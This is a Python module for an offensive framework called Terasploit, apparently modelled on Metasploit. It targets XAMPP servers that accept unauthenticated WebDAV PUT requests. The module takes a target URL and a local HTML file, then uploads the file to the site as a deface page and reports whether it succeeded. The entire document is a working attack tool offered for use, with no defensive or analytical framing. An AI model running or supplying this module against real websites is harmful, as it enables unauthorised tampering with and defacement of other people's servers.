#######
# Module/http_request: XAMPP WebDav Upload PHP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.auxiliary import *

class TerasploitModule(Auxiliary):

    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Module'      : Module.auxiliary,
                'Name'        : 'WebDav Unauthenticated HTML file upload via put request',
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description' : [
                    'Takes advantage of unauthenticated put requests WebDav',
                    'vulnerability on the target allowing user to upload a',
                    'deface page to the website.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('auxiliary',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptFile.create('html_file',['','yes','path of the html file to upload']),
            OptString.create('html_name',['filename','yes','html file name to use'])
        ])

    def run(self) -> tuple[str, bool]: 
        target, html_file, html_name = self.OPT()
        self.ParseURL(target)

        try:
            with open(html_file, 'r') as f:
                html_content = f.read()
                
            http_request = HTTP.Request(
                'put',
                url=f'{Target.scheme}://{Target.hostname}/{html_name}.html',
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'},
                data=html_content
            )
            
            if http_request.status_code in self.good_status_code():
                print_info (f"HTML file uploaded: {Target.scheme}://{Target.hostname}/{html_name}.html",)
                print_info (f'Status code: {http_request.status_code}',type='green')
                return
            else:
                print_info ('Failed to upload HTML file.',type='red')
                print_info (f'Status code: {http_request.status_code}')
                return

        except Exception as error:
            print_info (error,type='red')
            return